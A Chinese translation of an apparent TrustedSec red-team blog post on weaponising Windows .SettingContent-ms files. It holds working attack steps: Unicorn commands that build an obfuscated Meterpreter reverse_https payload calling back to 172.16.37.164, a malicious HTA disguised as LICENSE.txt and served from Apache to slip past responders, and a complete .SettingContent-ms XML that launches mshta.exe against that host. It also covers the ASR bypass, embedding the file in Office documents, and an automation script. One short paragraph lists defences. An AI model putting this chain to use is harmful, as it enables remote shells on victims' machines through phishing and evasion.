# 利用.SettingContent-ms文件执行任意代码的武器化方法

##### 译文声明
本文是翻译文章，原文来源：trustedsec.com。译文仅供参考，具体内容表达及含义以原文为准。

最近，Matt Nelson（@enigma0x3）发表了一篇关于利用.SettingContent-ms文件进行代码执行的文章。这篇文章非常有价值，因为作为攻击者，我们需要从不同系统中找到多种执行任意代码的方法。本文基于Matt的研究成果，展示了如何在远程系统上执行代码。

以下是Matt文章中的几个关键发现：
1. 微软可能不会修复此漏洞。
2. 可以直接通过浏览器执行任意代码攻击。
3. 可以将这种攻击嵌入到Office文档中，并且无需宏即可执行任意代码。
4. 在Microsoft Office目录中生成子进程，可以绕过使用白名单目录机制的Microsoft Attack Surface Reduction (ASR)。

对于攻击者来说，上述这些发现非常有吸引力，因为我们通常寻找新的方法来攻破系统，而不是依赖传统的手段（如宏或HTA）。Matt已经在研究绕过ASR并执行命令方面做了大量工作。

在我们最近的红队测试中，客户的系统具备一定的攻击检测能力，而Matt的文章为我们提供了及时的帮助。过去，一旦像DDE Auto这样的传统攻击技术被公开，攻击者会迅速将其武器化。例如，在DDE攻击向量公开后的24小时内，我们就看到了实际的攻击案例。

我决定深入研究Matt的工作，看看是否可以快速将其武器化。Matt在他的演示中使用了calc.exe来展示命令/代码执行，但并未进行武器化。首先，我决定使用Unicorn工具来生成一个混淆的攻击载荷（payload），并将其插入到Matt的概念验证（POC）中，用powershell.exe替换cmd.exe。

### 使用Unicorn生成混淆的PowerShell有效载荷

```bash
git clone https://github.com/trustedsec/unicorn
cd unicorn
python unicorn.py windows/meterpreter/reverse_https 172.16.37.164 443
```

这将创建一个混淆的PowerShell有效载荷，并将其导出到`powershell_attacks.txt`文件中。

![图1 – 混淆的PowerShell代码](图1.png)

然而，在将生成的PowerShell字符串插入.SettingContent-ms文件并执行时，遇到了字段长度限制的问题。

### 字段长度限制

经过一番研究，我发现DeepLink字段允许的最大字符长度（包括路径和所有内容）为517个字符。虽然这对于我们的有效载荷来说已经足够大，但这意味着不能使用更大的有效载荷。

有许多方法可以在517个字符内获得代码执行。在接下来的示例中，我们将使用`mshta.exe`这种常见的二进制攻击方式。MSHTA位于每个Microsoft支持的操作系统上，并且可以从命令行远程下载和执行HTA文件。

### 创建支持HTA的有效载荷

首先，我们使用Unicorn生成一个支持HTA的有效载荷：

```bash
python unicorn.py windows/meterpreter/reverse_https 172.16.37.164 443 hta
cp hta_attack/Launcher.hta /var/www/html/LICENSE.txt
service apache2 start
```

运行Unicorn后，会生成适当的HTA文件。以下是运行Unicorn的截图：

![图3 – 运行Unicorn生成payload](图3.png)

然后，我们复制HTA文件并将其重命名为`LICENSE.txt`。大多数情况下，事件响应人员可能会忽略扩展名为`.txt`的文件。此外，如果这是一个真实的模拟攻击，建议使用HTTPS并使用合法且高信誉的域名来躲避蓝队（blue team）的检测。

最后，我们启动Apache来托管恶意的HTA文件。

### 创建Test.SettingContent-ms文件

接下来，我们创建一个包含指向恶意HTA文件（`LICENSE.txt`）URL的`Test.SettingContent-ms`文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SettingContent xmlns="http://schemas.microsoft.com/windows/settings">
    <DeepLink>
        %windir%\system32\mshta.exe http://172.16.37.164/LICENSE.txt
    </DeepLink>
    <DisplayName>@shell32.dll,-4161</DisplayName>
    <Description>@shell32.dll,-4161</Description>
    <IconReference>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</IconReference>
    <ContentType>Windows.ImmersiveControlPanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</ContentType>
</SettingContent>
```

保存并双击该文件后，我们可以获得一个Meterpreter Shell。

![图5 – Meterpreter成功进行Shell访问](图5.png)

### 防御措施

对于防御者而言，最简单的方法是阻止系统从外部加载.SettingContent-ms类型的文件（阻止基于Web的攻击），或者在下载或执行任何文件时弹出警告。此外，可以将.SettingContent-ms文件的关联类型更改为记事本或其他不执行代码的软件。

### 自动化工具

为了简化攻击过程，我编写了一个名为`auto_settingcontent-ms.py`的脚本，它会自动为您创建Metasploit有效载荷、HTA文件和`Test.SettingContent-ms`文件。假设您已经安装了Metasploit、Python和Apache。

要运行该脚本，请先从GitHub克隆仓库，然后运行脚本：

```bash
git clone https://github.com/trustedsec/auto_SettingContent-ms
cd auto_SettingContent-ms
python auto_settingcontent-ms.py
```

这是一个简单的脚本，它将生成一个可用于在系统上执行命令/代码的.SettingContent-ms文件。该文件可以嵌入到Office文档中，也可以托管在网站上并诱使受害者点击来获得代码执行。这只是一个结合Metasploit使用的概念验证（POC）。

特别感谢Matt Nelson在SpecterOps上的出色工作以及通过特定扩展类型获得代码执行能力的示例。

[从GitHub下载Auto_SettingContent-MS脚本](https://github.com/trustedsec/auto_SettingContent-ms)

参考文献：
- [来自Matt Nelson的原帖.SettingContent-ms](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39)